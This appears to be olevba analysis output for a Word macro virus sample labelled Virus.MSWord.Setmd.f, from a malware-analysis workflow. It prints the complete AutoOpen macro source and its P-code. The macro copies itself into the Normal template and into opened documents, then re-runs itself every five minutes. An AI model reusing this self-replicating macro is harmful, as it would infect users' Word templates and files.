olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Setmd.f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO AutoOpen 
in file: ./Virus.MSWord.Setmd.f - OLE stream: 'AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim MyFile$
Dim x
Dim normal
Dim OkExist
Dim i
Dim TemplateName$
Dim active
Dim internal
Dim alarmtime
Dim alarm$

' set document mode
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
MyFile$ = WordBasic.[FileName$]()
If InStr(1, MyFile$, "ÎÄµµ") = 1 Then
    x = WordBasic.Dialog.FileSaveAs(dlg)
    MyFile$ = dlg.Name
'   MsgBox MyFile$, Str$(dlg.AddToMru), 64
Else
'   dlg.Format = 0
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
0    WordBasic.CurValues.FileSaveAs dlg
    MyFile$ = dlg.Name
'   MsgBox MyFile$, Str$(dlg.AddToMru), 64
End If

' if it is Macro Document, then goto bye2
If WordBasic.IsMacro(0) = -1 Then GoTo Bye2

' if Document is new, then goto Bye1
If MyFile$ = "" Then GoTo Bye1

' Save file as template
If dlg.Format = 0 Then
    WordBasic.FileSaveAs Name:=MyFile$, Format:=1, LockAnnot:=0, Password:="", AddToMru:=1, WritePassword:="", RecommendReadOnly:=0, EmbedFonts:=0, NativePictureFormat:=0, FormsData:=0, SaveAsAOCELetter:=0
Else
    WordBasic.FileSave
End If

' search macro AutoOpen in Normal template
normal = WordBasic.CountMacros(0)
OkExist = 0
For i = 1 To normal
    If WordBasic.[MacroName$](i, 0) = "AutoOpen" Then OkExist = 1
Next i

' Get normal template name
TemplateName$ = WordBasic.[DefaultDir$](2) + "\NORMAL.DOT"
'MsgBox TemplateName$, "", 64

' copy AutoOpen to normal template
If OkExist <> 1 Then
    WordBasic.Organizer Copy:=1, Source:=MyFile$, Destination:=TemplateName$, Name:="AutoOpen", Tab:=3
'   Organizer .Copy, .Source = MyFile$, .Destination = TemplateName$, .Name = "SaveDoc", .Tab = 3
    WordBasic.FileSaveAs Name:=TemplateName$, Format:=1, LockAnnot:=0, Password:="", AddToMru:=0, WritePassword:="", RecommendReadOnly:=0, EmbedFonts:=0, NativePictureFormat:=0, FormsData:=0, SaveAsAOCELetter:=0
End If

' search macro AutoOpen in active document
active = WordBasic.CountMacros(1)
OkExist = 0
For i = 1 To active
    If WordBasic.[MacroName$](i, 1) = "AutoOpen" Then OkExist = 1
Next i

' copy AutoOpen to active template
If OkExist <> 1 Then
    WordBasic.Organizer Copy:=1, Source:=TemplateName$, Destination:=MyFile$, Name:="AutoOpen", Tab:=3
'   Organizer .Copy, .Source = TemplateName$, .Destination = MyFile$, .Name = "SaveDoc", .Tab = 3
    WordBasic.FileSave
End If

Bye1:

' set document mode
dlg.Format = 0

Bye2:

' set timer to run AutoOpen again
internal = 5 / 24 / 60 ' internal time is 5 minutes
alarmtime = WordBasic.TimeValue(WordBasic.[Time$]()) + internal
alarm$ = WordBasic.[Time$](alarmtime)
WordBasic.OnTime alarm$, "AutoOpen"

End Sub
-------------------------------------------------------------------------------
VBA MACRO ThisDocument 
in file: ./Virus.MSWord.Setmd.f - OLE stream: 'ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Setmd.f
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AutoOpen - 8638 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn MyFile
' Line #3:
' 	Dim 
' 	VarDefn x
' Line #4:
' 	Dim 
' 	VarDefn normal
' Line #5:
' 	Dim 
' 	VarDefn OkExist
' Line #6:
' 	Dim 
' 	VarDefn i
' Line #7:
' 	Dim 
' 	VarDefn TemplateName
' Line #8:
' 	Dim 
' 	VarDefn active
' Line #9:
' 	Dim 
' 	VarDefn internal
' Line #10:
' 	Dim 
' 	VarDefn alarmtime
' Line #11:
' 	Dim 
' 	VarDefn alarm
' Line #12:
' Line #13:
' 	QuoteRem 0x0000 0x0012 " set document mode"
' Line #14:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #15:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St MyFile$ 
' Line #16:
' 	LitDI2 0x0001 
' 	Ld MyFile$ 
' 	LitStr 0x0004 "ÎÄµµ"
' 	FnInStr3 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #17:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	St x 
' Line #18:
' 	Ld dlg 
' 	MemLd New 
' 	St MyFile$ 
' Line #19:
' 	QuoteRem 0x0000 0x0029 "   MsgBox MyFile$, Str$(dlg.AddToMru), 64"
' Line #20:
' 	ElseBlock 
' Line #21:
' 	QuoteRem 0x0000 0x0011 "   dlg.Format = 0"
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' Line #38:
' Line #39:
' Line #40:
' Line #41:
' Line #42:
' Line #43:
' Line #44:
' Line #45:
' Line #46:
' Line #47:
' Line #48:
' Line #49:
' Line #50:
' Line #51:
' Line #52:
' Line #53:
' Line #54:
' Line #55:
' Line #56:
' Line #57:
' Line #58:
' Line #59:
' Line #60:
' Line #61:
' Line #62:
' Line #63:
' Line #64:
' Line #65:
' Line #66:
' Line #67:
' Line #68:
' Line #69:
' Line #70:
' Line #71:
' Line #72:
' Line #73:
' Line #74:
' Line #75:
' Line #76:
' Line #77:
' Line #78:
' Line #79:
' Line #80:
' Line #81:
' Line #82:
' Line #83:
' Line #84:
' Line #85:
' Line #86:
' Line #87:
' Line #88:
' Line #89:
' Line #90:
' Line #91:
' Line #92:
' Line #93:
' Line #94:
' Line #95:
' Line #96:
' Line #97:
' Line #98:
' Line #99:
' Line #100:
' Line #101:
' Line #102:
' Line #103:
' Line #104:
' Line #105:
' Line #106:
' Line #107:
' Line #108:
' Line #109:
' Line #110:
' Line #111:
' Line #112:
' Line #113:
' Line #114:
' Line #115:
' Line #116:
' Line #117:
' Line #118:
' Line #119:
' Line #120:
' Line #121:
' Line #122:
' Line #123:
' Line #124:
' Line #125:
' Line #126:
' Line #127:
' Line #128:
' Line #129:
' Line #130:
' Line #131:
' Line #132:
' Line #133:
' Line #134:
' Line #135:
' Line #136:
' Line #137:
' Line #138:
' Line #139:
' Line #140:
' Line #141:
' Line #142:
' Line #143:
' Line #144:
' Line #145:
' Line #146:
' Line #147:
' Line #148:
' Line #149:
' Line #150:
' Line #151:
' Line #152:
' Line #153:
' Line #154:
' Line #155:
' Line #156:
' Line #157:
' Line #158:
' Line #159:
' Line #160:
' Line #161:
' Line #162:
' Line #163:
' Line #164:
' Line #165:
' Line #166:
' Line #167:
' Line #168:
' Line #169:
' Line #170:
' Line #171:
' Line #172:
' Line #173:
' Line #174:
' Line #175:
' Line #176:
' Line #177:
' Line #178:
' Line #179:
' Line #180:
' Line #181:
' Line #182:
' Line #183:
' Line #184:
' Line #185:
' Line #186:
' Line #187:
' Line #188:
' Line #189:
' Line #190:
' Line #191:
' Line #192:
' Line #193:
' Line #194:
' Line #195:
' Line #196:
' Line #197:
' Line #198:
' Line #199:
' Line #200:
' Line #201:
' Line #202:
' Line #203:
' Line #204:
' Line #205:
' Line #206:
' Line #207:
' Line #208:
' Line #209:
' Line #210:
' Line #211:
' Line #212:
' Line #213:
' Line #214:
' Line #215:
' Line #216:
' Line #217:
' Line #218:
' Line #219:
' Line #220:
' Line #221:
' Line #222:
' Line #223:
' Line #224:
' Line #225:
' Line #226:
' Line #227:
' Line #228:
' Line #229:
' Line #230:
' Line #231:
' Line #232:
' Line #233:
' Line #234:
' Line #235:
' Line #236:
' Line #237:
' Line #238:
' Line #239:
' Line #240:
' Line #241:
' Line #242:
' Line #243:
' Line #244:
' Line #245:
' Line #246:
' Line #247:
' Line #248:
' Line #249:
' Line #250:
' Line #251:
' Line #252:
' Line #253:
' Line #254:
' Line #255:
' Line #256:
' Line #257:
' Line #258:
' Line #259:
' Line #260:
' Line #261:
' Line #262:
' Line #263:
' Line #264:
' Line #265:
' Line #266:
' Line #267:
' Line #268:
' Line #269:
' Line #270:
' Line #271:
' Line #272:
' Line #273:
' Line #274:
' Line #275:
' Line #276:
' Line #277:
' Line #278:
' Line #279:
' Line #280:
' Line #281:
' Line #282:
' Line #283:
' Line #284:
' Line #285:
' Line #286:
' Line #287:
' Line #288:
' Line #289:
' Line #290:
' Line #291:
' 	LineNum 0 
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #292:
' 	Ld dlg 
' 	MemLd New 
' 	St MyFile$ 
' Line #293:
' 	QuoteRem 0x0000 0x0029 "   MsgBox MyFile$, Str$(dlg.AddToMru), 64"
' Line #294:
' 	EndIfBlock 
' Line #295:
' Line #296:
' 	QuoteRem 0x0000 0x0028 " if it is Macro Document, then goto bye2"
' Line #297:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd IsMacro 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Bye2 
' 	EndIf 
' Line #298:
' Line #299:
' 	QuoteRem 0x0000 0x0023 " if Document is new, then goto Bye1"
' Line #300:
' 	Ld MyFile$ 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Bye1 
' 	EndIf 
' Line #301:
' Line #302:
' 	QuoteRem 0x0000 0x0016 " Save file as template"
' Line #303:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #304:
' 	Ld MyFile$ 
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	LitDI2 0x0000 
' 	ParamNamed LockAnnot 
' 	LitStr 0x0000 ""
' 	ParamNamed Password 
' 	LitDI2 0x0001 
' 	ParamNamed AddToMru 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePassword 
' 	LitDI2 0x0000 
' 	ParamNamed RecommendReadOnly 
' 	LitDI2 0x0000 
' 	ParamNamed EmbedFonts 
' 	LitDI2 0x0000 
' 	ParamNamed NativePictureFormat 
' 	LitDI2 0x0000 
' 	ParamNamed FormsData 
' 	LitDI2 0x0000 
' 	ParamNamed SaveAsAOCELetter 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x000B 
' Line #305:
' 	ElseBlock 
' Line #306:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #307:
' 	EndIfBlock 
' Line #308:
' Line #309:
' 	QuoteRem 0x0000 0x0029 " search macro AutoOpen in Normal template"
' Line #310:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	St normal 
' Line #311:
' 	LitDI2 0x0000 
' 	St OkExist 
' Line #312:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld normal 
' 	For 
' Line #313:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x0008 "AutoOpen"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St OkExist 
' 	EndIf 
' Line #314:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #315:
' Line #316:
' 	QuoteRem 0x0000 0x0019 " Get normal template name"
' Line #317:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x000B "\NORMAL.DOT"
' 	Add 
' 	St TemplateName$ 
' Line #318:
' 	QuoteRem 0x0000 0x001C "MsgBox TemplateName$, "", 64"
' Line #319:
' Line #320:
' 	QuoteRem 0x0000 0x0021 " copy AutoOpen to normal template"
' Line #321:
' 	Ld OkExist 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #322:
' 	LitDI2 0x0001 
' 	ParamNamed Copy 
' 	Ld MyFile$ 
' 	ParamNamed Source 
' 	Ld TemplateName$ 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "AutoOpen"
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0005 
' Line #323:
' 	QuoteRem 0x0000 0x0060 "   Organizer .Copy, .Source = MyFile$, .Destination = TemplateName$, .Name = "SaveDoc", .Tab = 3"
' Line #324:
' 	Ld TemplateName$ 
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	LitDI2 0x0000 
' 	ParamNamed LockAnnot 
' 	LitStr 0x0000 ""
' 	ParamNamed Password 
' 	LitDI2 0x0000 
' 	ParamNamed AddToMru 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePassword 
' 	LitDI2 0x0000 
' 	ParamNamed RecommendReadOnly 
' 	LitDI2 0x0000 
' 	ParamNamed EmbedFonts 
' 	LitDI2 0x0000 
' 	ParamNamed NativePictureFormat 
' 	LitDI2 0x0000 
' 	ParamNamed FormsData 
' 	LitDI2 0x0000 
' 	ParamNamed SaveAsAOCELetter 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x000B 
' Line #325:
' 	EndIfBlock 
' Line #326:
' Line #327:
' 	QuoteRem 0x0000 0x0029 " search macro AutoOpen in active document"
' Line #328:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	St active 
' Line #329:
' 	LitDI2 0x0000 
' 	St OkExist 
' Line #330:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld active 
' 	For 
' Line #331:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x0008 "AutoOpen"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St OkExist 
' 	EndIf 
' Line #332:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #333:
' Line #334:
' 	QuoteRem 0x0000 0x0021 " copy AutoOpen to active template"
' Line #335:
' 	Ld OkExist 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #336:
' 	LitDI2 0x0001 
' 	ParamNamed Copy 
' 	Ld TemplateName$ 
' 	ParamNamed Source 
' 	Ld MyFile$ 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "AutoOpen"
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0005 
' Line #337:
' 	QuoteRem 0x0000 0x0060 "   Organizer .Copy, .Source = TemplateName$, .Destination = MyFile$, .Name = "SaveDoc", .Tab = 3"
' Line #338:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #339:
' 	EndIfBlock 
' Line #340:
' Line #341:
' 	Label Bye1 
' Line #342:
' Line #343:
' 	QuoteRem 0x0000 0x0012 " set document mode"
' Line #344:
' 	LitDI2 0x0000 
' 	Ld dlg 
' 	MemSt Format$ 
' Line #345:
' Line #346:
' 	Label Bye2 
' Line #347:
' Line #348:
' 	QuoteRem 0x0000 0x0020 " set timer to run AutoOpen again"
' Line #349:
' 	LitDI2 0x0005 
' 	LitDI2 0x0018 
' 	Div 
' 	LitDI2 0x003C 
' 	Div 
' 	St internal 
' 	QuoteRem 0x0017 0x001B " internal time is 5 minutes"
' Line #350:
' 	Ld WordBasic 
' 	ArgsMemLd [Time$] 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd TimeValue 0x0001 
' 	Ld internal 
' 	Add 
' 	St alarmtime 
' Line #351:
' 	Ld alarmtime 
' 	Ld WordBasic 
' 	ArgsMemLd [Time$] 0x0001 
' 	St alarm$ 
' Line #352:
' 	Ld alarm$ 
' 	LitStr 0x0008 "AutoOpen"
' 	Ld WordBasic 
' 	ArgsMemCall OnTime 0x0002 
' Line #353:
' Line #354:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

